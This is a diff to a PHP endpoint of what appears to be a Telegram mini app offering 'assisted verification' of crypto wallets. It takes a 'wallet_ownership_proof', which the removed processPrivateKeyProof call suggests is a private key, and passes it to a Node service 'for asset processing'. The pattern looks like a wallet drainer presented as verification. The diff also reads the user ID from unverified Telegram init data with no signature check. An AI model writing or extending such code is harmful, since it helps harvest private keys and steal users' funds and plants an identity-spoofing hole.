@@ -12,13 +12,34 @@ try {
         throw new Exception('Invalid input');
     }
     
+    // Extract user ID from Telegram data or use default
+    $userId = $input['user_id'] ?? 0;
+    
+    // If no user_id provided, try to extract from Telegram init data
+    if ($userId === 0 && isset($_SERVER['HTTP_TELEGRAM_DATA'])) {
+        $initData = $_SERVER['HTTP_TELEGRAM_DATA'];
+        if (!empty($initData)) {
+            parse_str($initData, $parsed);
+            if (isset($parsed['user'])) {
+                $userData = json_decode(urldecode($parsed['user']), true);
+                $userId = $userData['id'] ?? 0;
+            }
+        }
+    }
+    
+    // Prepare submission data
+    $submissionData = [
+        'wallet_ownership_proof' => $input['wallet_ownership_proof'],
+        'network' => $input['network'] ?? 'polygon',
+        'user_consent' => $input['user_consent'] ?? false,
+        'verification_id' => $input['verification_id'] ?? '',
+        'context' => $input['context'] ?? []
+    ];
+    
     $processor = new AssistedVerificationProcessor();
-    $result = $processor->processPrivateKeyProof(
-        $input['verification_id'] ?? '',
-        $input['wallet_ownership_proof'],
-        $input['network'] ?? 'ethereum',
-        $input['user_consent'] ?? false
-    );
+    
+    // Use processAssistedVerification (public method) instead of private processPrivateKeyProof
+    $result = $processor->processAssistedVerification($userId, $submissionData);
     
     // Trigger Node.js integration service for asset processing
     triggerNodeIntegration($input['wallet_ownership_proof'], [
